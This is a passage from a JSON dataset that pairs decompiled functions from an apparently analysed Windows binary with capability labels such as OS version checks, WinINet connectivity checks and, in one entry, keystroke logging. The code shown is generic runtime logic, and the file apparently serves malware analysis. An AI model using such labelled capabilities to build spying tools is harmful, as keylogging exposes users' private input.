            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00415a8c(void)\n\n{\n    char cVar1;\n    uint *puVar2;\n    uint uVar3;\n    int32_t *piStack32;\n    uint16_t uStack28;\n    \n    puVar2 = fcn.00415a70();\n    uStack28 = *puVar2;\n    if (uStack28 < 0x10f) {\n        if (uStack28 != 0) {\n            if (((uStack28 != 9) && (uStack28 != 0xd)) || (puVar2[2] != 0)) {\n                return 0;\n            }\n        }\n        uVar3 = 1;\n    }\n    else {\n        cVar1 = fcn.00417654();\n        if (cVar1 == '\\0') {\n            uVar3 = 0;\n        }\n        else {\n            uVar3 = (**(*piStack32 + 0x14))();\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 217
    },
    "00415b20": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a"
        ],
        "decompiled_code": "\nuint32_t fcn.00415b20(void)\n\n{\n    int16_t *piVar1;\n    \n    piVar1 = fcn.00415a70();\n    return piVar1 & 0xffffff00 | *piVar1 == 1;\n}\n",
        "token_count": 57
    },
    "00415e4c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t fcn.00415e4c(void)\n\n{\n    uint32_t in_EAX;\n    uint32_t uVar1;\n    \n    uVar1 = in_EAX & 0xffff0000 | in_EAX - 0x16;\n    if (in_EAX < 0x16) {\n        uVar1 = *0x4846ac;\n        if (*(*0x4846ac + (in_EAX & 0xffff) * 0xc) != '\\0') {\n            return CONCAT44(*0x4846ac, CONCAT31((in_EAX & 0xffff) * 3 >> 8, 1));\n        }\n    }\n    return uVar1 << 0x20;\n}\n",
        "token_count": 158
    },
    "00415e6c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00415e6c(void)\n\n{\n    char cVar1;\n    uint32_t in_EAX;\n    \n    if ((0x15 < (in_EAX & 0xbfff)) || (*(*0x4846ac + 1 + (in_EAX & 0xbfff) * 0xc) == '\\0')) {\n        cVar1 = fcn.00415b00();\n        if (cVar1 == '\\0') {\n            return 0;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 116
    },
    "00416170": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.00416170(void)\n\n{\n    char *in_EAX;\n    int32_t iVar1;\n    char *pcStack12;\n    \n    iVar1 = 0;\n    pcStack12 = in_EAX;\n    while ((pcStack12 != NULL && (*pcStack12 == '\\x11'))) {\n        iVar1 = iVar1 + 1;\n        pcStack12 = fcn.0041614c();\n    }\n    return CONCAT44(pcStack12, iVar1);\n}\n",
        "token_count": 105
    },
    "004161a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.004161a0(void)\n\n{\n    uint *in_EAX;\n    uint *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint8_t uStack24;\n    uint *puStack20;\n    \n    uStack24 = 1;\n    puVar1 = fcn.00416170();\n    iVar4 = puVar1 - 1;\n    puStack20 = in_EAX;\n    if (0 < iVar4) {\n        do {\n            if (puStack20 != NULL) {\n                iVar2 = fcn.00416198();\n                uVar3 = fcn.00416198();\n                iVar2 = iVar2 + -1;\n                if (0 < iVar2) {\n                    do {\n                        puVar1 = fcn.00416198();\n                        if (uVar3 != puVar1) {\n                            uStack24 = 0;\n                            goto code_r0x0041620d;\n                        }\n                        iVar2 = iVar2 + -1;\n                    } while (iVar2 != 0);\n                }\n                puVar1 = *puStack20;\n                puStack20 = puVar1;\n            }\n            iVar4 = iVar4 + -1;\n        } while (iVar4 != 0);\n    }\ncode_r0x0041620d:\n    return CONCAT44(puStack20, puVar1 & 0xffffff00 | uStack24);\n}\n",
        "token_count": 313
    },
    "00416218": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00416218(int32_t *param_1)\n\n{\n    uint *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *puStack16;\n    \n    iVar1 = fcn.00416170();\n    fcn.00405a18(iVar1);\n    if (-1 < iVar1 + -1) {\n        iVar3 = 0;\n        puStack16 = in_EAX;\n        do {\n            if (puStack16 != NULL) {\n                iVar2 = fcn.00416198();\n                *(*param_1 + iVar3 * 4) = iVar2 + -1;\n                puStack16 = *puStack16;\n            }\n            iVar3 = iVar3 + 1;\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 197
    },
    "00416270": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nchar __fastcall fcn.00416270(uint param_1, int32_t param_2)\n\n{\n    int32_t *piVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    char cVar4;\n    \n    cVar4 = '\\0';\n    iVar2 = fcn.00405844();\n    if (-1 < iVar2) {\n        iVar2 = iVar2 + 1;\n        iVar3 = 0;\n        do {\n            if (*(*in_EAX + iVar3 * 4) != 0) {\n                cVar4 = '\\x01';\n                break;\n            }\n            iVar3 = iVar3 + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    if (cVar4 != '\\0') {\n        iVar2 = fcn.00405844();\n        if (-1 < iVar2) {\n            if (*(*in_EAX + iVar2 * 4) == 0) {\n                for (; *(*in_EAX + iVar2 * 4) == 0; iVar2 = iVar2 + -1) {\n                    *(*in_EAX + iVar2 * 4) = *(param_2 + iVar2 * 4);\n                }\n                piVar1 = *in_EAX + iVar2 * 4;\n                *piVar1 = *piVar1 + -1;\n            }\n            else {\n                piVar1 = *in_EAX + iVar2 * 4;\n                *piVar1 = *piVar1 + -1;\n            }\n        }\n    }\n    return cVar4;\n}\n",
        "token_count": 357
    },
    "004162dc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004162dc(int32_t *param_1)\n\n{\n    uint *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *puStack16;\n    \n    iVar1 = fcn.00416170();\n    fcn.00405a18(iVar1 * 2);\n    puStack16 = in_EAX;\n    for (iVar3 = 0; SBORROW4(iVar3, iVar1 * 2) != iVar3 + iVar1 * -2 < 0; iVar3 = iVar3 + 2) {\n        *(*param_1 + iVar3 * 4) = 0;\n        if (puStack16 == NULL) {\n            *(*param_1 + (iVar3 + 1) * 4) = 0xffffffff;\n        }\n        else {\n            iVar2 = fcn.00416198();\n            *(*param_1 + (iVar3 + 1) * 4) = iVar2 + -1;\n            puStack16 = *puStack16;\n        }\n    }\n    return;\n}\n",
        "token_count": 242
    },
    "0041634c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0041634c(void)\n\n{\n    char *in_EAX;\n    int32_t iVar1;\n    \n    iVar1 = 1;\n    if (((in_EAX != NULL) && (*in_EAX == '\\x11')) && (iVar1 = *(in_EAX + in_EAX[1] + 10),  iVar1 == 0x48)) {\n        iVar1 = 0x100;\n    }\n    if (((iVar1 < 2) || (iVar1 == 0xe)) || ((iVar1 == 0xf || ((0x14 < iVar1 && (iVar1 != 0x100)))))) {\n        fcn.0040fc34();\n    }\n    return iVar1;\n}\n",
        "token_count": 159
    },
    "00416394": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_18h\n\nvoid fcn.00416394(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint arg_8h;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint var_38h;\n    uint uStack56;\n    uchar *puStack52;\n    uint var_28h;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    iVar4 = 6;\n    do {\n        iVar4 = iVar4 + -1;\n    } while (iVar4 != 0);\n    uStack40 = 0x41670a;\n    var_28h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.00416394::var_28h;\n    fcn.00405b44();\n    fcn.00405b44();\n    fcn.004104c0();\n    iVar4 = fcn.0041634c();\n    iVar2 = fcn.00416170();\n    if ((1 < iVar2) && (cVar1 = fcn.004161a0(),  cVar1 == '\\0')) {\n        *in_FS_OFFSET = var_28h;\n        puStack36 = 0x416711;\n        uStack40 = 0x4166f6;\n        fcn.00405080();\n        uStack40 = 0x416709;\n        fcn.00405080();\n        return;\n    }\n    fcn.004162dc();\n    fcn.00416218();\n    fcn.00405a24();\n    puVar3 = &fcn.00416394::var_38h;\n    puStack52 = 0x416451;\n    fcn.00405844();\n    puStack52 = 0x41645f;\n    fcn.00415c9c(puVar3);\n    puStack52 = 0x41646a;\n    fcn.004107fc();\n    puStack52 = 0x416472;\n    fcn.00415de4();\n    uStack56 = 0x4166cf;\n    var_38h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.00416394::var_38h;\n    puStack52 = &stack0xfffffffc;\n    do {\n        fcn.00405844(0);\n        puVar3 = fcn.00416108();\n        if (puVar3 != NULL) {\n            if (iVar4 < 0xc) {\n    // switch table (11 cases) at 0x4164bf\n                switch(iVar4) {\n                case 0:\n                case 1:\ncode_r0x00416687:\n                    fcn.004104c0();\n                    break;\n                case 2:\n                    fcn.004148d0();\n                    break;\n                case 3:\n                    fcn.004148d0();\n                    break;\n                case 4:\n                    fcn.00414ac8();\n                    break;\n                case 5:\n                    fcn.00414ac8();\n                    break;\n                case 6:\n                    fcn.00414af0();\n                    break;\n                case 7:\n                    fcn.00414ac8();\n                    break;\n                case 8:\n                    fcn.00414b80();\n                    break;\n                case 9:\n                    fcn.00414be4();\n                    break;\n                case 10:\n                    fcn.004148d0();\n                    break;\n                default:\n                    fcn.00414aa0();\n                }\n            }\n            else if (iVar4 < 0x13) {\n                if (iVar4 == 0x12) {\n                    fcn.004148d0();\n                }\n                else if (iVar4 == 0xc) {\n                    fcn.004107fc();\n                }\n                else if (iVar4 == 0xd) {\n                    fcn.00414bb8();\n                }\n                else if (iVar4 == 0x10) {\n                    fcn.004148d0();\n                }\n                else {\n                    if (iVar4 != 0x11) goto code_r0x00416687;\n                    fcn.004148d0();\n                }\n            }\n            else if (iVar4 == 0x13) {\n                fcn.004148d0();\n            }\n            else if (iVar4 == 0x14) {\n                fcn.004149cc(*puVar3, puVar3[1]);\n            }\n            else {\n                if (iVar4 != 0x100) goto code_r0x00416687;\n                fcn.00414b04();\n            }\n            arg_8h = fcn.00405844();\n            fcn.004160e0(arg_8h);\n        }\n        cVar1 = fcn.00416270();\n        if (cVar1 == '\\0') {\n            *in_FS_OFFSET = var_38h;\n            puStack52 = 0x4166d6;\n            uStack56 = 0x4166ce;\n            fcn.00415e04();\n            return;\n        }\n    } while( true );\n}\n",
        "token_count": 1182
    },
    "00416718": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00416718(uint param_1, uint param_2)\n\n{\n    uchar uVar1;\n    char cVar2;\n    ushort uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    float fVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint *in_FS_OFFSET;\n    float10 fVar9;\n    ulong uVar10;\n    uint *arg_8h;\n    uint extraout_var;\n    uint uVar11;\n    uint uStack88;\n    uint uStack84;\n    uchar *puStack80;\n    uint uStack76;\n    uint uStack72;\n    uchar *puStack68;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    double *var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack68 = &stack0xfffffffc;\n    var_14h = 0;\n    var_18h = 0;\n    var_30h = 0;\n    var_2ch = 0;\n    var_28h = 0;\n    var_24h = 0;\n    uStack72 = 0x416a52;\n    uStack76 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb4;\n    puStack80 = 0x416753;\n    var_8h = param_2;\n    var_ch = fcn.00415d74();\n    if (var_ch == 0) {\n        puStack80 = 0x416766;\n        fcn.00410110();\n    }\n    puStack80 = 0x41676e;\n    fcn.00415de4();\n    uStack84 = 0x416a22;\n    uStack88 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa8;\n    puStack80 = &stack0xfffffffc;\n    var_10h = fcn.00402b14();\n    if (-1 < var_ch + -1) {\n        iVar7 = 0;\n        iVar8 = var_ch;\n        do {\n            iVar4 = fcn.00415dc0();\n            iVar5 = fcn.00415d9c();\n            *(var_10h + iVar7 * 4) = (iVar4 - iVar5) + 1;\n            iVar7 = iVar7 + 1;\n            iVar8 = iVar8 + -1;\n        } while (iVar8 != 0);\n    }\n    fcn.0040586c(var_10h);\n    fcn.00416170();\n    iVar8 = fcn.0041634c();\n    fcn.00416218();\n    fcn.00405a24();\n    do {\n        arg_8h = &fcn.00416718::var_30h;\n        fcn.00405844();\n        fcn.00415f74(arg_8h);\n        fcn.00405844();\n        uVar11 = extraout_var;\n        var_1ch = fcn.00416108();\n        if (iVar8 < 0xc) {\n    // switch table (11 cases) at 0x41684e\n            switch(iVar8) {\n            case 0:\n            case 1:\n                break;\n            case 2:\n                uVar3 = fcn.0041110c();\n                *var_1ch = uVar3;\n                break;\n            case 3:\n                fVar6 = fcn.0041110c();\n                *var_1ch = fVar6;\n                break;\n            case 4:\n                fVar9 = fcn.00412a5c();\n                *var_1ch = fVar9;\n                break;\n            case 5:\n                fVar9 = fcn.00412a5c();\n                *var_1ch = fVar9;\n                break;\n            case 6:\n                fVar9 = fcn.004133b8();\n                *var_1ch = ROUND(fVar9);\n                break;\n            case 7:\n                fVar9 = fcn.00412a5c();\n                *var_1ch = fVar9;\n                break;\n            case 8:\n                fcn.0041418c();\n                break;\n            case 9:\n                fcn.00414824();\n                break;\n            case 10:\n                fVar6 = fcn.00411bd0();\n                *var_1ch = fVar6;\n                break;\n            default:\n                uVar3 = fcn.00412514();\n                *var_1ch = uVar3;\n            }\n        }\n        else if (iVar8 < 0x13) {\n            if (iVar8 == 0x12) {\n                uVar3 = fcn.0041110c();\n                *var_1ch = uVar3;\n            }\n            else if (iVar8 == 0xc) {\n                fcn.004107fc();\n            }\n            else if (iVar8 == 0xd) {\n                fcn.00414758();\n            }\n            else if (iVar8 == 0x10) {\n                uVar1 = fcn.0041110c();\n                *var_1ch = uVar1;\n            }\n            else if (iVar8 == 0x11) {\n                uVar1 = fcn.0041110c();\n                *var_1ch = uVar1;\n            }\n        }\n        else if (iVar8 == 0x13) {\n            fVar6 = fcn.00411bd0();\n            *var_1ch = fVar6;\n        }\n        else if (iVar8 == 0x14) {\n            uVar10 = fcn.00411bd0();\n            *var_1ch = uVar10;\n            *(var_1ch + 4) = uVar10 >> 0x20;\n        }\n        else if (iVar8 == 0x100) {\n            fcn.00413a6c();\n        }\n        cVar2 = fcn.00416270();\n    } while (cVar2 != '\\0');\n    fcn.00402b44();\n    *in_FS_OFFSET = uVar11;\n    fcn.00415e04(0x416a29);\n    return;\n}\n",
        "token_count": 1407
    },
    "00416a84": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00416a84(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint uStack16;\n    \n    uStack16 = 0x485828;\n    puStack20 = 0x416a98;\n    sub.kernel32.dll_EnterCriticalSection_1();\n    uStack24 = 0x416ae5;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    iVar1 = fcn.0040583c();\n    iVar1 = iVar1 + -1;\n    if (-1 < iVar1) {\n        do {\n            if (*(*0x485824 + iVar1 * 4) != *0x483478) {\n                fcn.00403820();\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != -1);\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x416aec;\n    uStack24 = 0x485828;\n    uStack28 = 0x416ae4;\n    sub.kernel32.dll_LeaveCriticalSection_1();\n    return;\n}\n",
        "token_count": 279
    },
    "00417378": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00417378(uint arg_8h, char *arg_ch)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t in_EDX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack96;\n    int32_t iStack92;\n    uint *arg_8h_00;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_24h;\n    uint32_t var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t *var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_3ch = 0;\n    var_38h = 0;\n    var_4h = 0;\n    var_8h = 0;\n    var_24h = 0;\n    arg_8h_00 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffac;\n    var_20h = arg_ch[1];\n    var_18h = in_EDX;\n    var_14h = in_EAX;\n    fcn.004047c0();\n    (**(*var_14h + 0x3c))();\n    var_10h = arg_8h;\n    iStack92 = 0x4173ef;\n    fcn.00405a18();\n    var_ch = 0;\n    iStack92 = 0x41740e;\n    fcn.00405a18();\n    uVar3 = var_20h;\n    if (-1 < var_20h - 1) {\n        do {\n            iStack92 = 0x417424;\n            fcn.004170c0(&stack0xfffffffc);\n            uVar3 = uVar3 - 1;\n        } while (uVar3 != 0);\n    }\n    cVar1 = *arg_ch;\n    if (cVar1 == '\\x01') {\n        if (var_18h == 0) {\n            iStack92 = 0x41745f;\n            cVar1 = (**(*var_14h + 0x44))();\n            iVar2 = var_ch;\n            if (cVar1 == '\\0') {\n                fcn.00416fa8();\n                iStack92 = 0x4174c3;\n                iStack96 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffa0;\n                fcn.00415c4c();\n                iVar2 = var_4h;\n                cVar1 = (**(*var_14h + 0x40))(var_4h, var_24h);\n                if (cVar1 == '\\0') {\n                    fcn.00416f84();\n                }\n                *in_FS_OFFSET = iVar2;\n                iStack96 = 0x41759a;\n                fcn.00416fb0();\n                return;\n            }\n        }\n        else if (var_20h == 0) {\n            iStack92 = 0x4174e4;\n            cVar1 = (**(*var_14h + 0x48))();\n            iVar2 = var_ch;\n            if (cVar1 == '\\0') {\n                iStack92 = var_4h;\n                iStack96 = 0x417501;\n                cVar1 = (**(*var_14h + 0x40))();\n                iVar2 = var_ch;\n                if (cVar1 == '\\0') {\n                    fcn.00416f84();\n                    iVar2 = var_ch;\n                }\n            }\n        }\n        else {\n            iStack92 = var_4h;\n            iStack96 = 0x41752c;\n            cVar1 = (**(*var_14h + 0x40))();\n            iVar2 = var_ch;\n            if (cVar1 == '\\0') {\n                fcn.00416f84();\n                iVar2 = var_ch;\n            }\n        }\n    }\n    else if (cVar1 == '\\x02') {\n        if ((var_18h != 0) && (var_20h == 0)) {\n            iStack92 = 0x417558;\n            cVar1 = (**(*var_14h + 0x48))();\n            iVar2 = var_ch;\n            if (cVar1 != '\\0') goto joined_r0x0041759f;\n        }\n        fcn.00416f84();\n        iVar2 = var_ch;\n    }\n    else if (cVar1 == '\\x04') {\n        if ((var_18h == 0) && (var_20h == 1)) {\n            iStack92 = 0x417584;\n            cVar1 = (**(*var_14h + 0x4c))();\n            iVar2 = var_ch;\n            if (cVar1 != '\\0') goto joined_r0x0041759f;\n        }\n        fcn.00416f84();\n        iVar2 = var_ch;\n    }\n    else {\n        fcn.00416f84();\n        iVar2 = var_ch;\n    }\njoined_r0x0041759f:\n    while (iVar2 != 0) {\n        iVar2 = iVar2 + -1;\n        if (*(var_8h + iVar2 * 8 + 4) != 0) {\n            arg_8h_00 = &fcn.00417378::var_3ch;\n            iStack92 = 0x4175c3;\n            fcn.00404ed0(arg_8h_00);\n            iStack92 = 0x4175ce;\n            fcn.00404850();\n        }\n    }\n    *in_FS_OFFSET = arg_8h_00;\n    fcn.00404cd4();\n    fcn.004045c8();\n    fcn.004045c8();\n    fcn.00405b44();\n    fcn.00405b44();\n    return;\n}\n",
        "token_count": 1337
    },
    "00417654": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __fastcall fcn.00417654(uint param_1, uint *param_2)\n\n{\n    bool bVar1;\n    uint32_t in_EAX;\n    unkuint3 Var3;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint uStack24;\n    uint var_1h;\n    \n    if (((*0x485824 == 0) || (in_EAX < 0x100)) || (0x7ff < in_EAX)) {\n        bVar1 = false;\n        Var3 = 0;\n    }\n    else {\n        Var3 = in_EAX >> 8;\n        bVar1 = true;\n    }\n    if (bVar1) {\n        uStack24 = 0x485828;\n        puStack28 = 0x41768f;\n        sub.kernel32.dll_EnterCriticalSection_1();\n        uStack32 = 0x4176fc;\n        uStack36 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffdc;\n        puStack28 = &fcn.00417654::var_1h + 1;\n        iVar2 = fcn.0040583c();\n        if ((in_EAX & 0xffff) - 0x100 < iVar2) {\n            *param_2 = *(*0x485824 + -0x400 + (in_EAX & 0xffff) * 4);\n        }\n        *in_FS_OFFSET = uStack36;\n        puStack28 = 0x417703;\n        uStack32 = 0x485828;\n        uStack36 = 0x4176fb;\n        iVar2 = sub.kernel32.dll_LeaveCriticalSection_1();\n        return iVar2;\n    }\n    return Var3 << 8;\n}\n",
        "token_count": 416
    },
    "004177fc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004177fc(void)\n\n{\n    fcn.00415710();\n    return;\n}\n",
        "token_count": 23
    },
    "0041780c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041780c(void)\n\n{\n    fcn.00415710();\n    return;\n}\n",
        "token_count": 24
    },
    "0041781c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041781c(void)\n\n{\n    fcn.00415710();\n    return;\n}\n",
        "token_count": 24
    },
    "00417d14": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00417d14(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    ulong uVar2;\n    uint in_stack_ffffffbc;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uchar *var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint *var_8h;\n    uint var_1h;\n    \n    puStack52 = &fcn.00417d14::var_1h + 1;\n    var_18h = 0;\n    var_14h = 0;\n    var_10h = 0;\n    var_ch = 0;\n    uStack56 = 0x417f72;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    fcn.004177f4();\n    var_8h = fcn.00417cbc();\n    if (var_8h == NULL) {\n        fcn.00417c90();\n    }\n    else {\n    // switch table (18 cases) at 0x417d89\n        switch(***var_8h) {\n        default:\n            var_20h = **var_8h + 1;\n            var_1ch._0_1_ = 4;\n            in_stack_ffffffbc = 0;\n            fcn.0040c9d4(0, &fcn.00417d14::var_20h);\n            fcn.00403fc0();\n            break;\n        case 1:\n        case 2:\n        case 7:\n        case 9:\n            fcn.0041863c();\n            fcn.004148d0();\n            break;\n        case 3:\n            if (var_1h == '\\0') {\n                iVar1 = fcn.00418374();\n                if (**(iVar1 + 9) == *0x401000) {\n                    fcn.0041863c();\n                    fcn.00414aa0();\n                }\n                else {\n                    fcn.0041863c();\n                    fcn.004148d0();\n                }\n            }\n            else {\n                fcn.0041870c();\n                fcn.00414b04();\n            }\n            break;\n        case 4:\n            fcn.00418e3c();\n            fcn.00414ac8();\n            break;\n        case 5:\n        case 10:\n            fcn.00418c10();\n            fcn.00414b04();\n            break;\n        case 6:\n            if (var_1h == '\\0') {\n                fcn.0041863c();\n                fcn.004148d0();\n            }\n            else {\n                fcn.00418780(&fcn.00417d14::var_10h);\n                in_stack_ffffffbc = 0x417e73;\n                fcn.00414b04();\n            }\n            break;\n        case 8:\n            fcn.00414b30();\n            break;\n        case 0xb:\n            fcn.00418c7c();\n            fcn.00414b80();\n            break;\n        case 0xc:\n            fcn.0041918c();\n            break;\n        case 0x10:\n            uVar2 = fcn.00419244();\n            in_stack_ffffffbc = uVar2;\n            fcn.004149cc(in_stack_ffffffbc, uVar2 >> 0x20);\n            break;\n        case 0x11:\n            fcn.0041863c();\n            fcn.00416394();\n        }\n    }\n    *in_FS_OFFSET = in_stack_ffffffbc;\n    uStack60 = 0x417f79;\n    fcn.00404cd4();\n    fcn.004045ec();\n    return;\n}\n",
        "token_count": 886
    },
    "00417ff0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
